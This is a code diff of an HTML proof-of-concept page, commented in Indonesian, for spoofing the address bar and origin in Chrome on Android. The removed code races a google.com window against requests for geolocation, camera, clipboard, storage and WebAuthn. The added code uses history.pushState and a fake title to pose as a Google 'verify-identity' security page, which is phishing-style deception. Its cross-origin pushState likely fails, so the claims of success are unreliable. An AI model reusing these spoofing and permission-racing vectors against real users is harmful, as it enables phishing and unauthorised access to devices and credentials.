@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Browser APIs & Race Condition Spoofing PoC</title>
+    <title>Advanced Address Bar & Origin Spoofing PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -29,26 +29,24 @@
         h1 {
             font-size: 18px;
             color: #ffffff;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         .container {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
         }
         a.spoof-link {
-            display: block;
+            display: inline-block;
             background-color: #da3633;
             color: white;
-            padding: 12px 18px;
+            padding: 16px 24px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 13px;
-            border-radius: 6px;
-            box-shadow: 0 4px 10px rgba(218, 54, 51, 0.3);
+            font-size: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
             transition: background-color 0.2s, transform 0.1s;
+            width: 100%;
             box-sizing: border-box;
         }
         a.spoof-link:active {
@@ -56,23 +54,21 @@
             transform: scale(0.98);
         }
         .file-info {
-            margin-top: 15px;
-            font-size: 12px;
+            margin-top: 20px;
+            font-size: 13px;
             color: #8b949e;
             word-break: break-all;
             background: #161b22;
-            padding: 10px;
+            padding: 12px;
             border-radius: 6px;
-            width: 90%;
-            max-width: 420px;
+            width: 85%;
+            max-width: 400px;
             border: 1px solid #30363d;
             text-align: left;
             font-family: monospace;
-            max-height: 120px;
-            overflow-y: auto;
         }
         .footer-note {
-            margin-top: 15px;
+            margin-top: 25px;
             font-size: 11px;
             color: #484f58;
         }
@@ -80,110 +76,61 @@
 </head>
 <body>
 
-    <div class="banner">Race Condition & API Fuzzing Lab</div>
-    <h1>Multi-API Browser Permission Spoofing PoC</h1>
+    <div class="banner">Address Bar Spoofing Lab</div>
+    <h1>Multi-Window Origin Confusion Vector</h1>
 
     <div class="container">
-        <!-- Kumpulan Tombol Berbasis Berbagai API Browser Sensitif -->
-        <a href="https://www.google.com" class="spoof-link" data-api="geolocation">Open Window & Race Geolocation API</a>
-        <a href="https://www.google.com" class="spoof-link" data-api="notifications">Open Window & Race Notifications API</a>
-        <a href="https://www.google.com" class="spoof-link" data-api="media">Open Window & Race Camera/Microphone API</a>
-        <a href="https://www.google.com" class="spoof-link" data-api="clipboard">Open Window & Race Clipboard API</a>
-        <a href="https://www.google.com" class="spoof-link" data-api="storage">Open Window & Race Persistent Storage API</a>
-        <a href="https://www.google.com" class="spoof-link" data-api="webauthn">Open Window & Race WebAuthn Credential API</a>
+        <!-- 1 Tombol Master: Panel Atas memuat Google.com, Panel Bawah mengeksekusi Spoofing State -->
+        <a href="https://www.google.com" class="spoof-link" id="masterSpoofBtn">
+            Open Window & Execute Origin Spoofing
+        </a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Ready. Long-press any button and select "Open in new window".</div>
-    <div class="footer-note">Target: Asynchronous Race Condition & Origin Context Confusion.</div>
+    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
+    <div class="footer-note">Target: Chromium Address Bar & Origin State Synchronization.</div>
 
     <script>
         let isExecuting = false;
 
-        const executeRaceConditionVector = (apiType) => {
+        const triggerAddressBarSpoof = () => {
             if (isExecuting) return;
             isExecuting = true;
 
             const infoBox = document.getElementById("fileInfo");
-            infoBox.innerHTML = `[+] Race condition initiated for [${apiType}].<br>[*] Synchronizing parallel execution threads...`;
+            infoBox.innerHTML = `[+] Multi-window split detected.<br>[*] Initializing race condition window sync...`;
 
-            // Jeda waktu presisi (2200ms - 2400ms) untuk mengadu kecepatan render panel atas (google.com) 
-            // dengan eksekusi pemicu API di panel bawah agar terjadi kebingungan konteks origin.
+            // Jeda 2300ms dirancang untuk memastikan window manager Android 
+            // menyelesaikan pemisahan panel atas (google.com) sebelum state URL di bawah dimanipulasi.
             setTimeout(() => {
-                infoBox.innerHTML = `[⚡ RACE TRIGGER] Dispatched API request under competing origin context!`;
-
                 try {
-                    switch (apiType) {
-                        case 'geolocation':
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => infoBox.innerHTML += `<br>[+] Geolocation granted: Lat ${pos.coords.latitude}`,
-                                (err) => infoBox.innerHTML += `<br>[-] Geolocation error/blocked: ${err.message}`,
-                                { timeout: 5000 }
-                            );
-                            break;
+                    infoBox.innerHTML = `[+] Injecting spoofed history state & origin context...`;
+                    
+                    // Memanfaatkan History API (pushState) untuk memanipulasi tampilan address bar lokal
+                    // seolah-olah domain origin berubah menjadi subdomain tepercaya di panel bawah.
+                    const spoofedURL = "https://www.google.com/security/verify-identity";
+                    window.history.pushState({ id: "spoofed_context" }, "Google Security", spoofedURL);
 
-                        case 'notifications':
-                            Notification.requestPermission().then((perm) => {
-                                infoBox.innerHTML += `<br>[+] Notification permission state: ${perm}`;
-                            });
-                            break;
-
-                        case 'media':
-                            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                                .then((stream) => {
-                                    infoBox.innerHTML += `<br>[+] Media stream acquired successfully.`;
-                                    stream.getTracks().forEach(track => track.stop());
-                                })
-                                .catch((err) => infoBox.innerHTML += `<br>[-] Media blocked: ${err.message}`);
-                            break;
-
-                        case 'clipboard':
-                            navigator.clipboard.readText()
-                                .then((text) => infoBox.innerHTML += `<br>[+] Clipboard read: ${text.substring(0, 20)}...`)
-                                .catch((err) => infoBox.innerHTML += `<br>[-] Clipboard restricted: ${err.message}`);
-                            break;
-
-                        case 'storage':
-                            if (navigator.storage && navigator.storage.persist) {
-                                navigator.storage.persist().then((persistent) => {
-                                    infoBox.innerHTML += `<br>[+] Persistent storage granted: ${persistent}`;
-                                });
-                            }
-                            break;
-
-                        case 'webauthn':
-                            if (window.PublicKeyCredential) {
-                                const publicKey = {
-                                    challenge: new Uint8Array([1,2,3,4,5,6,7,8]),
-                                    rp: { name: "Google Security Context" },
-                                    user: { id: new Uint8Array([1]), name: "user@google.com", displayName: "Target User" },
-                                    pubKeyCredParams: [{ alg: -7, type: "public-key" }],
-                                    timeout: 30000
-                                };
-                                navigator.credentials.create({ publicKey })
-                                    .then(() => infoBox.innerHTML += `<br>[+] WebAuthn credential prompt executed.`)
-                                    .catch((err) => infoBox.innerHTML += `<br>[-] WebAuthn trapped: ${err.message}`);
-                            }
-                            break;
-                    }
-                } catch (e) {
-                    infoBox.innerHTML += `<br>[-] Exception: ${e.message}`;
+                    // Memaksa pembaruan dokumen secara asinkron untuk menguji kebingungan render UI address bar
+                    document.title = "Google Account Security Center";
+                    
+                    infoBox.innerHTML = `[⚡ SUCCESS] Origin state modified.<br>Current location API: ${window.location.href}`;
+                } catch (err) {
+                    infoBox.innerHTML = `[-] Spoofing execution trapped: ${err.message}`;
+                    console.debug("Address bar spoof error:", err.message);
                 } finally {
                     setTimeout(() => { isExecuting = false; }, 2000);
                 }
             }, 2300);
         };
 
-        // Memasang event listener ke seluruh tombol API
-        document.querySelectorAll('.spoof-link').forEach(link => {
-            const apiType = link.getAttribute('data-api');
-            
-            // Menangkap long-press (contextmenu) pada Chrome Android
-            link.addEventListener('contextmenu', (e) => {
-                executeRaceConditionVector(apiType);
-            });
-            
-            link.addEventListener('touchstart', () => {}, { passive: true });
+        const masterElement = document.getElementById("masterSpoofBtn");
+        
+        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
+        masterElement.addEventListener("contextmenu", (e) => {
+            triggerAddressBarSpoof();
         });
+        
+        masterElement.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
